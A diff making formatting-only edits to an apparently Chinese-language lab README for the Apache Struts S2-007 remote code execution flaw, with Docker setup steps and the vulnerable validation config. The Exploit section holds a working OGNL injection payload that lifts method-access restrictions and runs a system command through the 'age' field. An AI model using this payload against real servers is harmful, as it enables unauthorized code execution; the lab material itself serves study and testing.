@@ -1,13 +1,13 @@
 # S2-007 远程代码执行漏洞
 
-影响版本: 2.0.0 - 2.2.3
-漏洞详情: http://struts.apache.org/docs/s2-007.html
+影响版本：2.0.0 - 2.2.3
+漏洞详情：http://struts.apache.org/docs/s2-007.html
 
 ## 测试环境搭建
 
 ```
-docker-compose build
-docker-compose up -d
+docker compose build
+docker compose up -d
 ```
 
 ## 原理
@@ -19,9 +19,9 @@ docker-compose up -d
 ```java
 (...)
 public class UserAction extends ActionSupport {
-	private Integer age;
-	private String name;
-	private String email;
+    private Integer age;
+    private String name;
+    private String email;
 
 (...)
 ```
@@ -31,15 +31,15 @@ public class UserAction extends ActionSupport {
 ```xml
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE validators PUBLIC
-	"-//OpenSymphony Group//XWork Validator 1.0//EN"
-	"http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd">
+    "-//OpenSymphony Group//XWork Validator 1.0//EN"
+    "http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd">
 <validators>
-	<field name="age">
-		<field-validator type="int">
-			<param name="min">1</param>
-			<param name="max">150</param>
-		</field-validator>
-	</field>
+    <field name="age">
+        <field-validator type="int">
+            <param name="min">1</param>
+            <param name="max">150</param>
+        </field-validator>
+    </field>
 </validators>
 ```
 
@@ -53,12 +53,12 @@ public class UserAction extends ActionSupport {
 
 ## Exploit
 
-@rickgray 在原文中只给了弹计算器的POC，我给出执行任意代码的EXP：
+@rickgray 在原文中只给了弹计算器的 POC，我给出执行任意代码的 EXP：
 
 ```
 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
 ```
 
-将Exp传入可以利用的输入框（age），得到命令执行结果：
+将 Exp 传入可以利用的输入框（age），得到命令执行结果：
 
 ![](1.jpeg)
